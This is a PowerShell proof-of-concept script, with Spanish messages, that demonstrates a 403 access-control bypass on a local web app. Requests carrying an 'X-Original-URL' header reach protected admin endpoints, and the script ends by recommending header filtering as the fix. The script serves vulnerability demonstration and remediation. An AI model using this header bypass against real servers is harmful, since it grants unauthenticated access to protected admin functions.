Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "DEMOSTRACION VISUAL: Bypass 403 Vulnerability" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

# Test 1: Acceso normal
Write-Host "[TEST 1] Acceso NORMAL a /api/admin" -ForegroundColor Yellow
Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
Write-Host "URL: http://localhost:8080/api/admin" -ForegroundColor White
Write-Host ""

try {
    $response1 = Invoke-WebRequest -Uri "http://localhost:8080/api/admin" -Method GET
    Write-Host "✓ Status Code: $($response1.StatusCode)" -ForegroundColor Green
    Write-Host "✓ Content Type: $($response1.Headers.'Content-Type')" -ForegroundColor Green
    Write-Host "✓ Content Length: $($response1.Content.Length) bytes" -ForegroundColor Green
    Write-Host ""
    Write-Host "Respuesta (primeros 500 caracteres):" -ForegroundColor White
    Write-Host $response1.Content.Substring(0, [Math]::Min(500, $response1.Content.Length)) -ForegroundColor Gray
} catch {
    Write-Host "✗ ERROR: $($_.Exception.Response.StatusCode.value__) - $($_.Exception.Response.StatusDescription)" -ForegroundColor Red
    Write-Host "✗ Mensaje: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 2

# Test 2: Bypass con X-Original-URL
Write-Host "[TEST 2] Acceso con BYPASS (X-Original-URL header)" -ForegroundColor Yellow
Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
Write-Host "URL: http://localhost:8080/" -ForegroundColor White
Write-Host "Header: X-Original-URL: /api/admin" -ForegroundColor Magenta
Write-Host ""

try {
    $headers = @{
        "X-Original-URL" = "/api/admin"
    }
    $response2 = Invoke-WebRequest -Uri "http://localhost:8080/" -Headers $headers -Method GET
    Write-Host "✓ Status Code: $($response2.StatusCode)" -ForegroundColor Green
    Write-Host "✓ Content Type: $($response2.Headers.'Content-Type')" -ForegroundColor Green
    Write-Host "✓ Content Length: $($response2.Content.Length) bytes" -ForegroundColor Green
    Write-Host ""
    Write-Host "Respuesta (primeros 500 caracteres):" -ForegroundColor White
    Write-Host $response2.Content.Substring(0, [Math]::Min(500, $response2.Content.Length)) -ForegroundColor Gray
} catch {
    Write-Host "✗ ERROR: $($_.Exception.Response.StatusCode.value__) - $($_.Exception.Response.StatusDescription)" -ForegroundColor Red
    Write-Host "✗ Mensaje: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

# Test 3: Otros endpoints
Write-Host "[TEST 3] Probando otros endpoints protegidos" -ForegroundColor Yellow
Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
Write-Host ""

$endpoints = @(
    "/api/admin/tests",
    "/api/tests",
    "/api"
)

foreach ($endpoint in $endpoints) {
    Write-Host "Probando: $endpoint" -ForegroundColor White
    try {
        $headers = @{ "X-Original-URL" = $endpoint }
        $response = Invoke-WebRequest -Uri "http://localhost:8080/" -Headers $headers -Method GET -TimeoutSec 5
        Write-Host "  ✓ Status: $($response.StatusCode) | Length: $($response.Content.Length) bytes" -ForegroundColor Green
    } catch {
        Write-Host "  ✗ Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "CONCLUSIONES:" -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "🔴 VULNERABILIDAD CONFIRMADA:" -ForegroundColor Red
Write-Host "   - El header X-Original-URL permite acceder a rutas protegidas" -ForegroundColor White
Write-Host "   - Bypasea completamente el control de acceso" -ForegroundColor White
Write-Host "   - Un atacante podria acceder a /api/admin sin autenticacion" -ForegroundColor White
Write-Host ""
Write-Host "🛡️  SOLUCION RECOMENDADA:" -ForegroundColor Yellow
Write-Host "   - Bloquear headers maliciosos en un filtro de seguridad" -ForegroundColor White
Write-Host "   - Ver: VULNERABILITY_FIXES.md para codigo de correccion" -ForegroundColor White
Write-Host ""

Read-Host "Presiona Enter para salir"
